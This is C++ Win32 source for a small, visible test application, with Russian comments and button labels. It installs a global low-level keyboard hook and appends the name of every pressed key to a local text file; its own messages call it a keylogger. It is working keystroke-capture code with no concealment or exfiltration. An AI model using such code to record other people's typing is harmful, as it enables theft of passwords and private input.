// FixedHookTest_C++.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "FixedHookTest_C++.h"
#include <cstring>

using namespace std;

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name
KBDLLHOOKSTRUCT MainHookStruct;
wchar_t PressedKeyName[20];
HWND HookStartButton;
HWND HookFinishButton;
HWND hWnd;
bool HookStarted = false;

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);
LRESULT _stdcall HookCallback(int, WPARAM, LPARAM);
LRESULT _stdcall HookCallback_2(int, WPARAM, LPARAM);

HHOOK KeyDownHook;

LRESULT _stdcall HookCallback(int nCode, WPARAM CurrenrWparam, LPARAM CurrentLparam)
{

	if (nCode >= 0)
	{
		if (CurrenrWparam == WM_KEYDOWN)
		{
			/*DWORD dwThreadID = GetCurrentThreadId();
			HKL hCurKeyboard = GetKeyboardLayout(dwThreadID);*/

			MainHookStruct = *((KBDLLHOOKSTRUCT*)CurrentLparam);
			//***********Получаем имя нажатой клавиши здесь
			LONG Param = 1;
			Param += MainHookStruct.scanCode << 16;
			Param += MainHookStruct.flags << 24;
			GetKeyNameTextW(Param, PressedKeyName, sizeof(PressedKeyName));
			//***********

			//***********Записываем название нажатой клавиши в текстовый файл
			wofstream file;
			file.open("PressedKeys.txt", ios::out | ios::app);
			file << PressedKeyName;
			file << "\r\n";
			file.close();
			//***********

			if (MainHookStruct.vkCode == VK_F1)
			{
				MessageBox(NULL, L"F1 is pressed", L"Header", MB_ICONWARNING);
			}
		}
	}
	else
	{
		MessageBox(NULL, L"nCode = -1 (FirstHook)", L"Header", MB_ICONWARNING);
	}
	if (nCode >= 0)
	{
		return CallNextHookEx(NULL, -1, CurrenrWparam, CurrentLparam);
	}
	else
	{
		return 0;
	}
}

void SetHook()
{
	KeyDownHook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0);
}

void DestroyHook()
{
	UnhookWindowsHookEx(KeyDownHook);
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: Place code here.
	MSG msg;
	HACCEL hAccelTable;

	// Initialize global strings
	LoadString(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
	LoadString(hInstance, IDC_FIXEDHOOKTEST_C, szWindowClass, MAX_LOADSTRING);
	MyRegisterClass(hInstance);

	// Perform application initialization:
	if (!InitInstance (hInstance, nCmdShow))
	{
		return FALSE;
	}
	HookStartButton = CreateWindow(TEXT("BUTTON"), TEXT("Запустить запись нажатых клавиш"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
		50, 25, 250, 35, hWnd, NULL, hInstance, NULL);
	HookFinishButton = CreateWindow(TEXT("BUTTON"), TEXT("Остановить запись"), WS_CHILD | WS_VISIBLE | BS_DEFPUSHBUTTON | WS_TABSTOP,
		50, 75, 250, 35, hWnd, NULL, hInstance, NULL);
	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_FIXEDHOOKTEST_C));
	// Main message loop:
	while (GetMessage(&msg, NULL, 0, 0))
	{
		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
		{
			TranslateMessage(&msg);
			DispatchMessage(&msg);
		}
	}

	return (int) msg.wParam;
}



//
//  FUNCTION: MyRegisterClass()
//
//  PURPOSE: Registers the window class.
//
ATOM MyRegisterClass(HINSTANCE hInstance)
{
	WNDCLASSEX wcex;

	wcex.cbSize = sizeof(WNDCLASSEX);

	wcex.style			= CS_HREDRAW | CS_VREDRAW;
	wcex.lpfnWndProc	= WndProc;
	wcex.cbClsExtra		= 0;
	wcex.cbWndExtra		= 0;
	wcex.hInstance		= hInstance;
	wcex.hIcon			= LoadIcon(hInstance, MAKEINTRESOURCE(IDI_FIXEDHOOKTEST_C));
	wcex.hCursor		= LoadCursor(NULL, IDC_ARROW);
	wcex.hbrBackground	= (HBRUSH)(COLOR_WINDOW+1);
	wcex.lpszMenuName	= MAKEINTRESOURCE(IDC_FIXEDHOOKTEST_C);
	wcex.lpszClassName	= szWindowClass;
	wcex.hIconSm		= LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));

	return RegisterClassEx(&wcex);
}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{

   hInst = hInstance; // Store instance handle in our global variable

   hWnd = CreateWindow(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW,
      CW_USEDEFAULT, 0, 380, 200, NULL, NULL, hInstance, NULL);

	//Перемещаем окно в центр экрана***********************
	RECT rc;
	GetWindowRect(hWnd, &rc);
	int xPos = (GetSystemMetrics(SM_CXSCREEN) - rc.right) / 2;
	int yPos = (GetSystemMetrics(SM_CYSCREEN) - rc.bottom) / 2;
	SetWindowPos(hWnd, 0, xPos, yPos, 0, 0, SWP_NOZORDER | SWP_NOSIZE);
	//*****************************************************

   if (!hWnd)
   {
      return FALSE;
   }

   ShowWindow(hWnd, nCmdShow);
   UpdateWindow(hWnd);

   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE:  Processes messages for the main window.
//
//  WM_COMMAND	- process the application menu
//  WM_PAINT	- Paint the main window
//  WM_DESTROY	- post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int wmId, wmEvent;
	PAINTSTRUCT ps;
	HDC hdc;

	switch (message)
	{
	case WM_COMMAND:
		if (HIWORD(wParam) == BN_CLICKED)
		{
			if ((HWND)lParam == HookStartButton)
			{
				if (!HookStarted)
				{
					SetHook();
					HookStarted = true;
					MessageBox(hWnd, TEXT("Кейлоггер запущен!"), TEXT("СООБЩЕНИЕ"),
						MB_OK | MB_ICONWARNING);
				}
				else
				{
					MessageBox(hWnd, TEXT("Нельзя запустить кейлоггер повторно! (Сначала выключите его)"), TEXT("ОШИБКА"),
						MB_OK | MB_ICONERROR);
				}
			}
			else if ((HWND)lParam == HookFinishButton)
			{
				if (HookStarted)
				{
					DestroyHook();
					HookStarted = false;
					MessageBox(hWnd, TEXT("Кейлоггер выключен!"), TEXT("СООБЩЕНИЕ"),
						MB_OK | MB_ICONWARNING);
				}
				else
				{
					MessageBox(hWnd, TEXT("Сначала запустите кейлоггер!"), TEXT("ОШИБКА"),
						MB_OK | MB_ICONERROR);
				}
			}
		}
		wmId    = LOWORD(wParam);
		wmEvent = HIWORD(wParam);
		// Parse the menu selections:
		switch (wmId)
		{
		case IDM_ABOUT:
			DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About);
			break;
		case IDM_EXIT:
			DestroyWindow(hWnd);
			break;
		default:
			return DefWindowProc(hWnd, message, wParam, lParam);
		}
		break;
	case WM_PAINT:
		hdc = BeginPaint(hWnd, &ps);
		// TODO: Add any drawing code here...
		EndPaint(hWnd, &ps);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}
	return 0;
}

// Message handler for about box.
INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)
{
	UNREFERENCED_PARAMETER(lParam);
	switch (message)
	{
	case WM_INITDIALOG:
		return (INT_PTR)TRUE;

	case WM_COMMAND:
		if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL)
		{
			EndDialog(hDlg, LOWORD(wParam));
			return (INT_PTR)TRUE;
		}
		break;
	}
	return (INT_PTR)FALSE;
}
